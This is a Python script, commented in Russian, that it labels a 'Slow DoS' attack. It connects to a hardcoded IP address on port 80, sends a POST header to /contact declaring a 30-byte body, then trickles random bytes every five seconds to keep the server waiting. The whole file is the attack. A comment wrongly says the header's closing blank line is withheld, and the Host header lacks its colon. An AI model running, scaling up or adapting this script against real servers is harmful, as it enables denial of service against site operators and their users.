import socket
import time
import random

TARGET = "64.233.164.101"
PORT = 80

def slow_attack():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET, PORT))
    
    # 1. Отправляем начало запроса (Fwd Pkt 1)
    content_length = 30
    header = (
        f"POST /contact HTTP/1.1\r\n"
        f"HOST {TARGET}\r\n"
        f"User-Agent: Mozilla/5.0\r\n"
        f"Content-Length: {content_length}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n\r\n"
    ).encode()
    
    s.send(header)
    print("Header sent")

    # НЕ отправляем финальный \r\n\r\n, сервер ждет...
    
    print("Socket connected. Starting slow sleep...")
    
    for i in range(content_length):
        try:
            char = random.choice("abcdefghijklmnopqrstuvwxyz").encode()
            s.send(char)
            print(f"Sent byte {i+1}, now sleeeping")
            time.sleep(5)
        except Exception as e:
            print(f"Got an exception: {e}")
            break

    s.close()

if __name__ == "__main__":
    print("Launching Slow DoS...")
    slow_attack()
    print("Done.")